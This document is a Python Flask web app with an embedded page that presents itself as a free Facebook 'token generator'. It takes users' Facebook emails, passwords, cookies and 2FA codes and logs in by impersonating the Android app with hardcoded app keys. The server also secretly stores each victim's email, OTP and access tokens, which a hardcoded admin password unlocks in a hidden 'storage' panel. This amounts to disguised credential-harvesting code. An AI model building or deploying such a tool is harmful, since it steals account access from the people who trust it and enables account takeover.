import requests
import uuid
import random
import json
import re
from flask import Flask, request, jsonify, render_template_string
from datetime import datetime

app = Flask(__name__)

# Storage for token history (In-memory for single file script)
token_history = []
ADMIN_PASSWORD = "MADHU@2003"

class FacebookTokenGenerator:
    B_API_URL = "https://b-api.facebook.com/method/auth.login"
    FB_ANDROID_APP_ID = "350685531728"
    FB_ANDROID_CLIENT_TOKEN = "62f8ce9f74b12f84c123cc23437a4a32"
    FB_LITE_APP_ID = "275254692598279"
    USER_AGENT = "Dalvik/2.1.0 (Linux; U; Android 12; SM-G998B Build/SP1A.210812.016) [FBAN/FB4A;FBAV/407.0.0.30.85;FBLC/en_US;FBBV/457696233;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G998B;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2220};FB_FW/1;]"

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": self.USER_AGENT,
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*"
        })

    def generate_machine_id(self):
        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        return "".join(random.choice(chars) for _ in range(24))

    def generate_ids(self):
        return {
            "adid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "family_device_id": str(uuid.uuid4()),
            "session_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            "reg_instance": str(uuid.uuid4()),
            "machine_id": self.generate_machine_id()
        }

    def get_profile_info(self, access_token=None, cookie=None):
        try:
            headers = {"User-Agent": self.USER_AGENT}
            if cookie:
                headers["Cookie"] = cookie
            
            url = "https://graph.facebook.com/me?fields=id,name,picture.type(large)"
            if access_token:
                url += f"&access_token={access_token}"
            
            res = requests.get(url, headers=headers, timeout=10).json()
            if "name" in res:
                return {
                    "id": res.get("id"),
                    "name": res.get("name"),
                    "picture": res.get("picture", {}).get("data", {}).get("url")
                }
            return None
        except:
            return None

    def login_with_cookie(self, cookie):
        # Optimized cookie check
        info = self.get_profile_info(cookie=cookie)
        if info:
            return {
                "access_token": "COOKIE_VALID_SESSION", 
                "uid": info["id"], 
                "name": info["name"], 
                "picture": info["picture"]
            }
        return {"error_msg": "Invalid or Expired Cookie", "error_code": 401}

    def login(self, email=None, password=None):
        ids = self.generate_ids()
        data = {
            "email": email,
            "password": password,
            "adid": ids["adid"],
            "device_id": ids["device_id"],
            "family_device_id": ids["family_device_id"],
            "session_id": ids["session_id"],
            "advertiser_id": ids["advertiser_id"],
            "reg_instance": ids["reg_instance"],
            "machine_id": ids["machine_id"],
            "locale": "en_US",
            "country_code": "US",
            "client_country_code": "US",
            "cpl": "true",
            "source": "login",
            "format": "json",
            "credentials_type": "password",
            "error_detail_type": "button_with_disabled",
            "generate_session_cookies": "1",
            "generate_analytics_claim": "1",
            "generate_machine_id": "1",
            "tier": "regular",
            "device": "SM-G998B",
            "os_ver": "12",
            "app_id": self.FB_ANDROID_APP_ID,
            "app_ver": "407.0.0.30.85",
            "meta_inf_fbmeta": "NO_FILE",
            "currently_logged_in_userid": "0",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
            "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "api_key": "882a8490361da98702bf97a021ddc14d"
        }
        data["sig"] = self.FB_ANDROID_CLIENT_TOKEN
        try:
            response = self.session.post(self.B_API_URL, data=data, timeout=15)
            return response.json()
        except Exception as e:
            return {"error_msg": str(e), "error_code": 999}

    def submit_2fa(self, email, password, code, session_data_str):
        try:
            session_data = json.loads(session_data_str) if isinstance(session_data_str, str) else (session_data_str or {})
        except:
            session_data = {}
        ids = self.generate_ids()
        data = {
            "email": email,
            "password": password,
            "adid": ids["adid"],
            "device_id": ids["device_id"],
            "family_device_id": ids["family_device_id"],
            "session_id": ids["session_id"],
            "format": "json",
            "credentials_type": "two_factor",
            "generate_session_cookies": "1",
            "source": "login",
            "device": "SM-G998B",
            "os_ver": "12",
            "app_id": self.FB_ANDROID_APP_ID,
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "api_key": "882a8490361da98702bf97a021ddc14d",
            "sig": self.FB_ANDROID_CLIENT_TOKEN,
            "twofactor_code": code,
            "userid": session_data.get("uid", "0"),
            "machine_id": session_data.get("machine_id", ""),
            "first_factor": session_data.get("login_first_factor", ""),
            "auth_token": session_data.get("auth_token", "")
        }
        try:
            response = self.session.post(self.B_API_URL, data=data, timeout=15)
            return response.json()
        except:
            return {"error_msg": "Timeout during 2FA", "error_code": 999}

    def exchange_to_eaad(self, auth_token):
        if auth_token == "COOKIE_VALID_SESSION": return "NOT_AVAILABLE_FOR_COOKIE"
        url = "https://api.facebook.com/method/auth.getSessionforApp"
        data = {
            "access_token": auth_token,
            "format": "json",
            "new_app_id": self.FB_LITE_APP_ID,
            "generate_session_cookies": "1"
        }
        try:
            response = self.session.post(url, data=data, timeout=10)
            res_json = response.json()
            return res_json.get("access_token")
        except:
            return None

gen = FacebookTokenGenerator()

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Token System EAAD6V7 token generate</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary: #00d2ff;
            --secondary: #3a7bd5;
            --glass: rgba(255, 255, 255, 0.08);
            --glass-border: rgba(255, 255, 255, 0.15);
            --text: #ffffff;
            --bg-blur: 25px;
        }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { 
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: url('https://i.postimg.cc/xCfq6NLN/e16e6f3e2401be9ca69ff0b299fd174a.jpg') no-repeat center center fixed; 
            background-size: cover;
            display: flex; 
            flex-direction: column;
            min-height: 100vh; 
            margin: 0; 
            color: var(--text);
            overflow-x: hidden;
            align-items: center;
        }
        .header {
            width: 100%;
            padding: 1rem 0;
            background: rgba(0,0,0,0.7);
            backdrop-filter: blur(var(--bg-blur));
            text-align: center;
            border-bottom: 1px solid var(--glass-border);
            z-index: 1000;
        }
        .header h2 { margin: 0; font-size: 22px; background: linear-gradient(to right, var(--primary), #fff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 800; letter-spacing: 1px; }
        .owner-info { display: flex; align-items: center; justify-content: center; margin-top: 8px; gap: 10px; }
        .owner-info img { width: 42px; height: 42px; border-radius: 50%; border: 2px solid var(--primary); box-shadow: 0 0 10px var(--primary); }
        .owner-info span { font-weight: 600; font-size: 16px; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }

        .main-content {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1.5rem;
            width: 100%;
        }

        .container { 
            background: var(--glass); 
            padding: 2rem; 
            border-radius: 25px; 
            backdrop-filter: blur(var(--bg-blur)); 
            border: 1px solid var(--glass-border);
            width: 100%; 
            max-width: 420px; 
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6);
            animation: slideUp 0.6s cubic-bezier(0.23, 1, 0.32, 1);
        }
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }

        h1 { text-align: center; font-size: 24px; margin-bottom: 2rem; font-weight: 700; letter-spacing: -0.5px; }
        .form-group { margin-bottom: 1.25rem; position: relative; }
        label { display: block; margin-bottom: 0.6rem; font-weight: 500; font-size: 13px; color: var(--primary); text-transform: uppercase; }
        
        .input-wrapper { position: relative; }
        input, textarea { 
            width: 100%; padding: 0.9rem 1.1rem; background: rgba(0,0,0,0.45); 
            border: 1px solid var(--glass-border); border-radius: 14px; 
            font-size: 16px; color: white;
            transition: all 0.3s ease;
            appearance: none;
        }
        input:focus, textarea:focus { outline: none; border-color: var(--primary); background: rgba(0,0,0,0.6); box-shadow: 0 0 15px rgba(0, 210, 255, 0.2); }
        .toggle-pass { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: rgba(255,255,255,0.5); font-size: 18px; z-index: 5; }
        
        button { 
            width: 100%; padding: 1.1rem; background: linear-gradient(135deg, var(--primary), var(--secondary)); color: white; 
            border: none; border-radius: 14px; font-size: 16px; font-weight: 700; 
            cursor: pointer; transition: all 0.3s ease; 
            margin-bottom: 15px;
            display: flex; align-items: center; justify-content: center; gap: 12px;
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.3);
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 12px 25px rgba(0, 210, 255, 0.3); opacity: 0.95; }
        button:active { transform: translateY(-1px); }
        button:disabled { opacity: 0.6; cursor: not-allowed; }
        
        .result-card { 
            margin-top: 2rem; padding: 1.5rem; border-radius: 20px; 
            background: rgba(0,0,0,0.6); border: 1px solid var(--glass-border);
            animation: fadeIn 0.4s ease-out;
        }
        @keyframes fadeIn { from { opacity: 0; scale: 0.95; } to { opacity: 1; scale: 1; } }
        
        .result-item { margin-bottom: 1.25rem; }
        .result-label { font-weight: 700; font-size: 11px; color: var(--primary); text-transform: uppercase; display: block; margin-bottom: 0.5rem; letter-spacing: 0.5px; }
        .result-value-container { display: flex; gap: 10px; align-items: stretch; }
        .result-value { 
            flex: 1; font-family: 'SF Mono', 'Fira Code', monospace; font-size: 12px; 
            color: #eee; background: rgba(255,255,255,0.06); padding: 12px; 
            border-radius: 10px; border: 1px solid var(--glass-border); 
            word-break: break-all; max-height: 120px; overflow-y: auto;
        }
        .copy-btn { width: auto; padding: 0 15px; margin: 0; font-size: 15px; background: rgba(255,255,255,0.1); border-radius: 10px; }

        .profile-display { display: flex; align-items: center; gap: 15px; margin-bottom: 1.5rem; background: rgba(255,255,255,0.05); padding: 12px; border-radius: 15px; }
        .profile-display img { width: 55px; height: 55px; border-radius: 50%; border: 2px solid var(--primary); object-fit: cover; }
        .profile-display b { font-size: 18px; font-weight: 600; }

        footer {
            width: 100%; padding: 1.5rem; background: rgba(0,0,0,0.7); 
            text-align: center; border-top: 1px solid var(--glass-border);
            font-size: 13px; color: rgba(255,255,255,0.6);
            backdrop-filter: blur(10px);
        }

        #error-msg { color: #ff5e5e; background: rgba(255,0,0,0.15); padding: 1rem; border-radius: 12px; margin-top: 1rem; display: none; text-align: center; border: 1px solid rgba(255,0,0,0.25); font-size: 14px; font-weight: 500; }
        .hidden { display: none; }
        
        .modal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95);
            display: none; justify-content: center; align-items: flex-start; z-index: 2000; backdrop-filter: blur(15px);
            padding: 1rem; overflow-y: auto;
        }
        .modal-content {
            background: rgba(15, 15, 15, 0.9); border: 1px solid var(--glass-border);
            padding: 1.5rem; border-radius: 25px; width: 100%; max-width: 850px; 
            margin-top: 2rem; margin-bottom: 2rem;
        }
        .history-card {
            background: rgba(255,255,255,0.04); border: 1px solid var(--glass-border);
            border-radius: 18px; padding: 1.25rem; margin-bottom: 1.25rem;
        }
        .history-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; }
        .history-user { display: flex; align-items: center; gap: 12px; }
        .history-user img { width: 48px; height: 48px; border-radius: 50%; border: 2px solid var(--primary); }
        .history-meta { font-size: 12px; opacity: 0.5; margin-top: 2px; }
        .history-actions { display: flex; gap: 8px; }
        .del-btn { background: rgba(255, 77, 77, 0.2); color: #ff4d4d; width: auto; padding: 8px 12px; font-size: 12px; border: 1px solid rgba(255, 77, 77, 0.3); }
        .del-btn:hover { background: #ff4d4d; color: white; }
        
        .login-details { font-size: 11px; color: var(--primary); margin-top: 8px; font-family: monospace; background: rgba(0,0,0,0.3); padding: 5px 10px; border-radius: 5px; }

        @media (max-width: 480px) {
            .container { padding: 1.5rem; border-radius: 20px; }
            h1 { font-size: 20px; }
            .modal-content { padding: 1rem; border-radius: 20px; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h2>EAAD6V7 token generate</h2>
        <div class="owner-info">
          alt="Owner">
            <span>OWN3R: ALL PUBLIC FREE USE</span>
        </div>
    </div>

    <div class="main-content">
        <div class="container">
            <h1><i class="fab fa-facebook-square"></i> TOK3N EXTR4CTION (SELECT ONE)</h1>
            
            <div id="login-form">
                <div class="form-group">
                    <label>Email / Phone</label>
                    <input type="text" id="email" placeholder="Enter email">
                </div>
                <div class="form-group">
                    <label>Password(पासवर्ड फॉरगेट करके ईमेल आईडी पर जो OTP आए उनको डाले)</label>
                    <div class="input-wrapper">
                        <input type="password" id="password" placeholder="Enter password ">
                        <i class="fas fa-eye toggle-pass" onclick="togglePassword()"></i>
                    </div>
                </div>
                <div style="text-align: center; margin: 15px 0; font-size: 12px; font-weight: 800; opacity: 0.3; letter-spacing: 2px;">EXCLUSIVE METHOD</div>
                <div class="form-group">
                    <label>Direct Cookie</label>
                    <textarea id="cookie" rows="3" placeholder="Paste full cookie string"></textarea>
                </div>
                <button id="login-btn"><i class="fas fa-rocket"></i> FAST EXTRACT</button>
                <button id="admin-trigger-btn" style="background: rgba(255,255,255,0.08); font-size: 14px;"><i class="fas fa-shield-alt"></i> OPEN STORAGE</button>
            </div>

            <div id="two-factor-form" class="hidden">
                <p style="text-align: center; margin-bottom: 1.5rem; color: var(--primary); font-weight: 700;">2FA VERIFICATION</p>
                <div class="form-group">
                    <label>OTP Code</label>
                    <input type="text" id="code" placeholder="Enter 6-digit code">
                </div>
                <button id="verify-btn"><i class="fas fa-check-circle"></i> VERIFY & FINISH</button>
            </div>

            <div id="error-msg"></div>

            <div id="result-area" class="hidden">
                <div class="result-card">
                    <div class="profile-display">
                        <img id="res-pic" src="" alt="Profile">
                        <b id="res-name"></b>
                    </div>
                    <div class="result-item">
                        <span class="result-label">EAAB Token</span>
                        <div class="result-value-container">
                            <div id="token-eaab" class="result-value"></div>
                            <button class="copy-btn" onclick="copyText('token-eaab')"><i class="fas fa-copy"></i></button>
                        </div>
                    </div>
                    <div class="result-item">
                        <span class="result-label">EAAD Token</span>
                        <div class="result-value-container">
                            <div id="token-eaad" class="result-value"></div>
                            <button class="copy-btn" onclick="copyText('token-eaad')"><i class="fas fa-copy"></i></button>
                        </div>
                    </div>
                </div>
                <button id="reset-btn" style="margin-top: 1.5rem; background: rgba(255,255,255,0.1);"><i class="fas fa-sync-alt"></i> EXTRACT NEW</button>
            </div>
        </div>
    </div>

    <div id="admin-modal" class="modal">
        <div class="modal-content">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 2rem; border-bottom: 1px solid var(--glass-border); padding-bottom: 1.2rem;">
                <h3 style="margin:0; font-size:22px;"><i class="fas fa-database" style="color:var(--primary);"></i> SECURE STORAGE</h3>
                <button id="close-admin" style="width: auto; background: none; font-size: 24px; padding:0; margin:0;"><i class="fas fa-times-circle"></i></button>
            </div>
            <div id="history-list"></div>
        </div>
    </div>

    <footer>
        Developed by public </b> <br>
        <span style="font-size: 10px; margin-top: 5px; display: block; opacity: 0.5;">PREMIUM VERSION 4.0</span>
    </footer>

    <script>
        const loginForm = document.getElementById('login-form');
        const twoFactorForm = document.getElementById('two-factor-form');
        const resultArea = document.getElementById('result-area');
        const errorMsg = document.getElementById('error-msg');
        const loginBtn = document.getElementById('login-btn');
        const verifyBtn = document.getElementById('verify-btn');
        const resetBtn = document.getElementById('reset-btn');
        const adminBtn = document.getElementById('admin-trigger-btn');
        const adminModal = document.getElementById('admin-modal');
        const closeAdmin = document.getElementById('close-admin');
        const historyList = document.getElementById('history-list');

        let currentSessionData = null;

        function togglePassword() {
            const passInput = document.getElementById('password');
            const icon = document.querySelector('.toggle-pass');
            if (passInput.type === 'password') {
                passInput.type = 'text';
                icon.classList.replace('fa-eye', 'fa-eye-slash');
            } else {
                passInput.type = 'password';
                icon.classList.replace('fa-eye-slash', 'fa-eye');
            }
        }

        function showError(msg) {
            errorMsg.innerText = msg;
            errorMsg.style.display = 'block';
            errorMsg.scrollIntoView({ behavior: 'smooth', block: 'center' });
            setTimeout(() => { errorMsg.style.display = 'none'; }, 7000);
        }

        function copyText(id) {
            const text = document.getElementById(id).innerText;
            if (!text || text === 'N/A' || text === 'NOT_AVAILABLE_FOR_COOKIE') return;
            navigator.clipboard.writeText(text).then(() => {
                alert("Token copied successfully!");
            });
        }

        loginBtn.addEventListener('click', async () => {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const cookie = document.getElementById('cookie').value;

            if (!cookie && (!email || !password)) {
                showError('Enter Login Details or Cookie.');
                return;
            }

            loginBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> EXTRACTING...';
            loginBtn.disabled = true;
            
            try {
                const res = await fetch('/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password, cookie })
                });
                const data = await res.json();
                if (data.status === 'success') {
                    showResults(data);
                } else if (data.status === '2fa_required') {
                    currentSessionData = data.error_data;
                    loginForm.classList.add('hidden');
                    twoFactorForm.classList.remove('hidden');
                } else {
                    showError(data.message || 'Extraction failed. Server Error.');
                }
            } catch { showError('Network connection lost.'); }
            finally { 
                loginBtn.innerHTML = '<i class="fas fa-rocket"></i> FAST EXTRACT';
                loginBtn.disabled = false; 
            }
        });

        verifyBtn.addEventListener('click', async () => {
            const code = document.getElementById('code').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            if (!code) return;
            
            verifyBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> FINISHING...';
            verifyBtn.disabled = true;
            
            try {
                const res = await fetch('/submit_2fa', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password, code, session_data: currentSessionData })
                });
                const data = await res.json();
                if (data.status === 'success') showResults(data);
                else showError(data.message || 'OTP Invalid.');
            } catch { showError('Network error.'); }
            finally { 
                verifyBtn.innerHTML = '<i class="fas fa-check-circle"></i> VERIFY & FINISH';
                verifyBtn.disabled = false; 
            }
        });

        function showResults(data) {
            loginForm.classList.add('hidden');
            twoFactorForm.classList.add('hidden');
            resultArea.classList.remove('hidden');
            document.getElementById('res-name').innerText = data.profile_name || 'Extracted Profile';
            document.getElementById('res-pic').src = data.profile_pic || 'https://www.facebook.com/images/profile/timeline/fb_blank_user_2x.png';
            document.getElementById('token-eaab').innerText = data.access_token;
            document.getElementById('token-eaad').innerText = data.eaad_token || 'N/A';
        }

        resetBtn.addEventListener('click', () => {
            resultArea.classList.add('hidden');
            loginForm.classList.remove('hidden');
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            document.getElementById('cookie').value = '';
            document.getElementById('code').value = '';
        });

        adminBtn.addEventListener('click', async () => {
            const pass = prompt("Enter Admin Secret Key:");
            if (pass !== 'MADHU@2003') return alert("Access Denied.");
            
            adminModal.style.display = 'flex';
            await refreshHistory(pass);
        });

        async function refreshHistory(pass) {
            historyList.innerHTML = '<div style="text-align:center; padding: 2rem;"><i class="fas fa-spinner fa-spin fa-3x" style="color:var(--primary);"></i></div>';
            try {
                const res = await fetch('/admin/history', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({password: pass})
                });
                const data = await res.json();
                historyList.innerHTML = data.map((item, index) => `
                    <div class="history-card">
                        <div class="history-header">
                            <div class="history-user">
                                <img src="${item.picture || 'https://www.facebook.com/images/profile/timeline/fb_blank_user_2x.png'}" alt="FB">
                                <div>
                                    <div style="font-weight:bold; font-size:16px;">${item.name}</div>
                                    <div class="history-time"><i class="fas fa-clock"></i> ${item.time}</div>
                                </div>
                            </div>
                            <button class="del-btn" onclick="deleteHistory(${index}, '${pass}')"><i class="fas fa-trash-alt"></i></button>
                        </div>
                        <div class="login-details">
                            <i class="fas fa-envelope"></i> ID: ${item.email} ${item.otp ? ' | <i class="fas fa-key"></i> OTP: ' + item.otp : ''}
                        </div>
                        <div style="margin-top:15px;">
                            <span class="result-label">EAAB / EAAB6 Token</span>
                            <div style="display:flex; gap:10px;">
                                <div class="result-value" id="hist-token-${index}">${item.token}</div>
                                <button class="copy-btn" onclick="copyText('hist-token-${index}')"><i class="fas fa-copy"></i></button>
                            </div>
                        </div>
                        <div style="margin-top:10px;">
                            <span class="result-label">EAAD Token</span>
                            <div style="display:flex; gap:10px;">
                                <div class="result-value" id="hist-eaad-${index}">${item.eaad || 'N/A'}</div>
                                <button class="copy-btn" onclick="copyText('hist-eaad-${index}')"><i class="fas fa-copy"></i></button>
                            </div>
                        </div>
                    </div>
                `).join('') || '<div style="text-align:center; padding: 3rem; opacity: 0.3;">STORAGE EMPTY</div>';
            } catch { historyList.innerHTML = "FETCH FAILED"; }
        }

        async function deleteHistory(index, pass) {
            if(!confirm("DELETE PERMANENTLY?")) return;
            await fetch('/admin/delete', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({password: pass, index: index})
            });
            refreshHistory(pass);
        }

        closeAdmin.addEventListener('click', () => adminModal.style.display = 'none');
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    email = data.get('email')
    password = data.get('password')
    cookie = data.get('cookie')
    
    if cookie:
        res = gen.login_with_cookie(cookie)
    else:
        res = gen.login(email, password)
    
    if "access_token" in res:
        eaad = gen.exchange_to_eaad(res["access_token"])
        info = gen.get_profile_info(access_token=res["access_token"]) if not cookie else res
        
        token_entry = {
            "email": email or "Cookie Login",
            "name": info.get("name", "Unknown User"),
            "token": res["access_token"],
            "eaad": eaad,
            "picture": info.get("picture"),
            "otp": None,
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        token_history.append(token_entry)
        
        return jsonify({
            "status": "success",
            "access_token": res["access_token"],
            "eaad_token": eaad,
            "profile_name": info.get("name"),
            "profile_pic": info.get("picture"),
            "uid": res.get("uid")
        })
    elif res.get("error_code") == 406:
        return jsonify({"status": "2fa_required", "error_data": res.get("error_data")})
    
    return jsonify({"status": "failed", "message": res.get("error_msg")})

@app.route('/submit_2fa', methods=['POST'])
def submit_2fa():
    data = request.json
    res = gen.submit_2fa(data['email'], data['password'], data['code'], data['session_data'])
    if "access_token" in res:
        eaad = gen.exchange_to_eaad(res["access_token"])
        info = gen.get_profile_info(access_token=res["access_token"])
        
        token_entry = {
            "email": data['email'],
            "name": info.get("name", "Unknown User"),
            "token": res["access_token"],
            "eaad": eaad,
            "picture": info.get("picture"),
            "otp": data['code'],
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        token_history.append(token_entry)
        
        return jsonify({
            "status": "success",
            "access_token": res["access_token"],
            "eaad_token": eaad,
            "profile_name": info.get("name"),
            "profile_pic": info.get("picture")
        })
    return jsonify({"status": "failed", "message": res.get("error_msg") or "Verification failed"})

@app.route('/admin/history', methods=['POST'])
def get_history():
    if request.json.get('password') == ADMIN_PASSWORD:
        return jsonify(token_history[::-1]) # Show latest first
    return jsonify([]), 401

@app.route('/admin/delete', methods=['POST'])
def delete_history():
    data = request.json
    if data.get('password') == ADMIN_PASSWORD:
        idx = data.get('index')
        # Since history is reversed in display, we map index back
        real_idx = len(token_history) - 1 - idx
        if 0 <= real_idx < len(token_history):
            token_history.pop(real_idx)
            return jsonify({"success": True})
    return jsonify({"success": False}), 401

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
